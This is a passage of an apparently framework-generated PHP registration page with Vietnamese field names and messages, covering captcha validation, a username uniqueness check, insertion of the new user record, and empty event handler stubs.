    		$gsFormError .= ($gsFormError <> "") ? "<br>" : "";
			$gsFormError .= "Mã xác nhận không đúng";
 		}

		// Return validate result
		$ValidateForm = ($gsFormError == "");

		// Call Form_CustomValidate event
		$sFormCustomError = "";
		$ValidateForm = $ValidateForm && $this->Form_CustomValidate($sFormCustomError);
		if ($sFormCustomError <> "") {
			$gsFormError .= ($gsFormError <> "") ? "<br>" : "";
			$gsFormError .= $sFormCustomError;
		}
		return $ValidateForm;
	}

	// Add record
	function AddRow() {
		global $conn, $Security, $user;
		if ($user->tendangnhap->CurrentValue <> "") { // Check field with unique index
			$sFilter = "(tendangnhap = '" . ew_AdjustSql($user->tendangnhap->CurrentValue) . "')";
			$rsChk = $user->LoadRs($sFilter);
			if ($rsChk && !$rsChk->EOF) {
				$sIdxErrMsg = str_replace("%f", "tendangnhap", "Tên đăng nhập '%v' đã tồn tại '%f'");
				$sIdxErrMsg = str_replace("%v", $user->tendangnhap->CurrentValue, $sIdxErrMsg);
				$this->setMessage($sIdxErrMsg);
				$rsChk->Close();
				return FALSE;
			}
		}
		$rsnew = array();

		// Field tendangnhap
		$user->tendangnhap->SetDbValueDef($user->tendangnhap->CurrentValue, "");
		$rsnew['tendangnhap'] =& $user->tendangnhap->DbValue;

		// Field quocgia_id
		$user->quocgia_id->SetDbValueDef($user->quocgia_id->CurrentValue, NULL);
		$rsnew['quocgia_id'] =& $user->quocgia_id->DbValue;

		// Field gioi_tinh
		$user->gioi_tinh->SetDbValueDef($user->gioi_tinh->CurrentValue, 0);
		$rsnew['gioi_tinh'] =& $user->gioi_tinh->DbValue;

		// Field hoten_nguoilienhe
		$user->hoten_nguoilienhe->SetDbValueDef($user->hoten_nguoilienhe->CurrentValue, "");
		$rsnew['hoten_nguoilienhe'] =& $user->hoten_nguoilienhe->DbValue;

		// Field mat_khau
		$user->mat_khau->SetDbValueDef($user->mat_khau->CurrentValue, "");
		$rsnew['mat_khau'] =& $user->mat_khau->DbValue;

		// Field ten_congty
		$user->ten_congty->SetDbValueDef($user->ten_congty->CurrentValue, "");
		$rsnew['ten_congty'] =& $user->ten_congty->DbValue;

		// Field chuc_nang
		$user->chuc_nang->SetDbValueDef($user->chuc_nang->CurrentValue, 0);
		$rsnew['chuc_nang'] =& $user->chuc_nang->DbValue;

		// Field so_dienthoai
		$user->so_dienthoai->SetDbValueDef($user->so_dienthoai->CurrentValue, NULL);
		$rsnew['so_dienthoai'] =& $user->so_dienthoai->DbValue;

		// Field dia_chi
		$user->dia_chi->SetDbValueDef($user->dia_chi->CurrentValue, "");
		$rsnew['dia_chi'] =& $user->dia_chi->DbValue;

		// Field tinh_thanh
		$user->tinh_thanh->SetDbValueDef($user->tinh_thanh->CurrentValue, NULL);
		$rsnew['tinh_thanh'] =& $user->tinh_thanh->DbValue;

		// Field quan_huyen
		$user->quan_huyen->SetDbValueDef($user->quan_huyen->CurrentValue, NULL);
		$rsnew['quan_huyen'] =& $user->quan_huyen->DbValue;

		// Field truycap_gannhat
		$user->truycap_gannhat->SetDbValueDef(ew_UnFormatDateTime($user->truycap_gannhat->CurrentValue, 7), ew_CurrentDateTime());
		$rsnew['truycap_gannhat'] =& $user->truycap_gannhat->DbValue;

		// Field kieu_giaodien
		$user->kieu_giaodien->SetDbValueDef($user->kieu_giaodien->CurrentValue, 1);
		$rsnew['kieu_giaodien'] =& $user->kieu_giaodien->DbValue;

		// Field UserLevelID
		$rsnew['UserLevelID'] = 5; // Set default User Level

		// Field nguoidung_option
		$user->nguoidung_option->SetDbValueDef($user->nguoidung_option->CurrentValue, 1);
		$rsnew['nguoidung_option'] =& $user->nguoidung_option->DbValue;

		// Field ngay_thamgia
		$user->ngay_thamgia->SetDbValueDef(ew_UnFormatDateTime($user->ngay_thamgia->CurrentValue, 7), ew_CurrentDate());
		$rsnew['ngay_thamgia'] =& $user->ngay_thamgia->DbValue;
		// Field nguoidung_id
		// Field UserLevelID
		// Call Row Inserting event

		$bInsertRow = $user->Row_Inserting($rsnew);
		if ($bInsertRow) {
			$conn->raiseErrorFn = 'ew_ErrorFn';
			$AddRow = $conn->Execute($user->InsertSQL($rsnew));
			$conn->raiseErrorFn = '';
		} else {
			if ($user->CancelMessage <> "") {
				$this->setMessage($user->CancelMessage);
				$user->CancelMessage = "";
			} else {
				$this->setMessage("Đăng ký thành viên bị lỗi");
			}
			$AddRow = FALSE;
		}
		if ($AddRow) {
			$user->nguoidung_id->setDbValue($conn->Insert_ID());
			$rsnew['nguoidung_id'] =& $user->nguoidung_id->DbValue;

			// Call Row Inserted event
			$user->Row_Inserted($rsnew);
		}
		return $AddRow;
	}

	// Page Load event
	function Page_Load() {

		//echo "Page Load";
	}

	// Page Unload event
	function Page_Unload() {

		//echo "Page Unload";
	}

	// Email Sending event
	function Email_Sending(&$Email, &$Args) {

		//var_dump($Email); var_dump($Args); exit();
		return TRUE;
	}

	// Form Custom Validate event
	function Form_CustomValidate(&$CustomError) {

		// Return error message in CustomError
		return TRUE;
	}
}
?>